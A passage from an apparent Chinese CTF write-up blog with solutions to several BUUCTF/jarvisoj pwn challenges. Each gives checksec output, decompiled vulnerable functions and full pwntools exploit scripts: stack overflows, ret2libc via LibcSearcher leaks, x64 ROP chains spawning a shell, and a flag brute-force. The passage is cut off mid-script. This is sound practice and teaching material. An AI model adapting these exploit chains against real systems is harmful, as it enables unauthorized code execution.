style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">5</span><span class="mord">6</span></span></span></span>，这种都行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">   payload += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">   payload += p8(<span class="number">0x100</span>-<span class="number">0x40</span> + i)</span><br></pre></td></tr></table></figure>
<p>这样的payload就可以通过检测了，然后逐字节爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26493</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;guess the index &#123;&#125;&#x27;s char&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">   <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">      pay = payload[<span class="number">0</span>:<span class="number">2</span>*i-<span class="number">2</span>] + <span class="built_in">hex</span>(c)[<span class="number">2</span>:] + payload[<span class="number">2</span>*i:]</span><br><span class="line">      sh.sendlineafter(<span class="string">&#x27;guess&gt; &#x27;</span>,pay)</span><br><span class="line">      ans = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;Yaaaay!&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">         flag += <span class="built_in">chr</span>(c)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;flag=&#x27;</span>,flag</span><br><span class="line"> </span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>
<h3 id="3exp-35"><a class="markdownIt-Anchor" href="#3exp-35"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#bypass</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">   payload += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">   payload += p8(<span class="number">0x100</span>-<span class="number">0x40</span> + i)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#exploit</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26493</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;guess the index &#123;&#125;&#x27;s char&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">   <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">      pay = payload[<span class="number">0</span>:<span class="number">2</span>*i-<span class="number">2</span>] + <span class="built_in">hex</span>(c)[<span class="number">2</span>:] + payload[<span class="number">2</span>*i:]</span><br><span class="line">      sh.sendlineafter(<span class="string">&#x27;guess&gt; &#x27;</span>,pay)</span><br><span class="line">      ans = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;Yaaaay!&#x27;</span> <span class="keyword">in</span> ans:</span><br><span class="line">         flag += <span class="built_in">chr</span>(c)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;flag&gt;&#x27;</span>,flag</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj_typo"><a class="markdownIt-Anchor" href="#jarvisoj_typo"></a> jarvisoj_typo</h2>
<h3 id="1checksec-49"><a class="markdownIt-Anchor" href="#1checksec-49"></a> 1.checksec</h3>
<pre><code>Arch:     arm-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8000)
</code></pre>
<p>发现是arm架构的pwn</p>
<h2 id="jarvisoj_level0"><a class="markdownIt-Anchor" href="#jarvisoj_level0"></a> jarvisoj_level0</h2>
<p>环境：Ubuntu16</p>
<h3 id="1checksec-50"><a class="markdownIt-Anchor" href="#1checksec-50"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/o</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-48"><a class="markdownIt-Anchor" href="#2ida-48"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1LL</span>, <span class="string">&quot;Hello, World\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vulnerable_function</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>简单溢出，且含有system binsh</p>
</blockquote>
<h3 id="3exp-36"><a class="markdownIt-Anchor" href="#3exp-36"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28704</span>)</span><br><span class="line">binsh = <span class="number">0x040059A</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj_level2"><a class="markdownIt-Anchor" href="#jarvisoj_level2"></a> jarvisoj_level2</h2>
<p>环境：Ubuntu：16</p>
<h3 id="1checksec-51"><a class="markdownIt-Anchor" href="#1checksec-51"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-49"><a class="markdownIt-Anchor" href="#2ida-49"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vulnerable_function</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>有system和binsh</p>
</blockquote>
<h3 id="3exp-37"><a class="markdownIt-Anchor" href="#3exp-37"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26265</span>)</span><br><span class="line"><span class="comment">#p= process(&quot;./level2&quot;)</span></span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x0804845C</span></span><br><span class="line">binsh = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(sys_addr) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>system只能选取已经执行过的system</p>
</blockquote>
<h2 id="jarvisoj_level3"><a class="markdownIt-Anchor" href="#jarvisoj_level3"></a> jarvisoj_level3</h2>
<h3 id="1checksec-52"><a class="markdownIt-Anchor" href="#1checksec-52"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-50"><a class="markdownIt-Anchor" href="#2ida-50"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vulnerable_function</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>栈溢出，需要找到libc</p>
</blockquote>
<h3 id="3exp-38"><a class="markdownIt-Anchor" href="#3exp-38"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26281</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_start = elf.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">libc_start_got = elf.got[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x08048350</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">p1 += p32(write_plt)+p32(start_addr)</span><br><span class="line">p1 += p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,p1)</span><br><span class="line">write_real = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_real)</span><br><span class="line">libc_base = write_real - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base=&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)</span><br><span class="line">p1 += p32(sys_addr)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj_level3_x64"><a class="markdownIt-Anchor" href="#jarvisoj_level3_x64"></a> jarvisoj_level3_x64</h2>
<h3 id="1checksec-53"><a class="markdownIt-Anchor" href="#1checksec-53"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-51"><a class="markdownIt-Anchor" href="#2ida-51"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vulnerable_function</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>read 溢出+libc_leak</p>
</blockquote>
<h3 id="3exp-39"><a class="markdownIt-Anchor" href="#3exp-39"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27722</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&quot;vulnerable_function&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x04006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x04006b1</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x0400550</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400550 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400499 : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_r15_ret)+p64(read_got)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_plt)+p64(vuln_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_real = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>,read_real)</span><br><span class="line"></span><br><span class="line">libc_base = read_real - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libc base==&gt;%s&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;system addr==&gt;%s&quot;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">log.info(<span class="string">&quot;/bin/sh addr==&gt;%s&quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(binsh)+p64(sys_addr)+p64(vuln_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj_level4"><a class="markdownIt-Anchor" href="#jarvisoj_level4"></a> jarvisoj_level4</h2>
<h3 id="1checksec-54"><a class="markdownIt-Anchor" href="#1checksec-54"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-52"><a class="markdownIt-Anchor" href="#2ida-52"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vulnerable_function</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这题本意是然大家用Dynefl来泄露libc的，但是LibcSearcher一样可以</p>
</blockquote>
<h3 id="3exp-40"><a class="markdownIt-Anchor" href="#3exp-40"></a> 3.EXP</h3>
<h4 id="31-libcsearcher"><a class="markdownIt-Anchor" href="#31-libcsearcher"></a> <strong>3.1 libcsearcher</strong></h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28393</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level4&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main = elf.got[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(write_plt)+p32(main_addr)+p32(<span 